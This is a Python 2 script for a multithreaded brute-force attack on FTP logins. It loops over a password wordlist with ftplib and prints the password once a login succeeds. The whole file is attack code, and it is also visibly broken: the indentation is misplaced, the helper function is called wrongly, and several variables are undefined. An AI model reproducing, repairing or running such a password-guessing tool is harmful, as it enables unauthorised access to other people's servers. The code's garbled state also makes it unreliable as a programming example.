#!/usr/bin/python
 
import threading
import Queue
import socket
import ftplib, sys
import time
from progressbar import *
from datetime import datetime  

passwordList = open('passwords.txt','r').read().splitlines()
 
class WorkerThread(threading.Thread) :
 
	def __init__(self, queue, tid) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid
	def ftpbreaker(addr, user, passwd):
		try:
			con = ftplib.FTP(addr)
			con.login(user, passwd)
			con.close()
			return 1
		
		except Exception, error:
			return 0
		 
		except KeyboardInterrupt:
			sys.exit()
	def run(self) :
		while True :
			addr = ''
			widgets = ['[>] Brute: ', Percentage(), ' ', Bar(marker='#',left='[',right=']')]	
			username = "ftpuser"
			passwdsPath ="E:\passwds.txt"
			passwdLines = len(open(passwdsPath).readlines())
			print "[>] Trying passwords for user: "+user
			bar = ProgressBar(widgets=widgets, maxval=passwdLines)
			passwdsFile = open(passwdsPath, 'r')
			bar.start()
			c=0
			t1 = datetime.now()
			try :
				username = self.queue.get(timeout=1)
 
			except 	Queue.Empty :
				return
 
			try :
				for password in passwordList:
					con = ftpbreaker(addr, user, passwd)
					c+=1
					bar.update(c)
					if con == 1:
						break
				bar.finish()
				print "[!] Password found :) > "+passwd
				print "[?] The brute force took: "+str(t)	
				print "[?] Target: " +addr
	if con == 1:
		break
			except :
				raise 
 
			self.queue.task_done()
 
queue = Queue.Queue()
 
threads = []
for i in range(1, 40) : # Number of threads
	worker = WorkerThread(queue, i) 
	worker.setDaemon(True)
	worker.start()
	threads.append(worker)
     # Push usernames onto queue
 
queue.join()
 
# wait for all threads to exit 
 
for item in threads :
	item.join()
 
print "Testing Complete!"
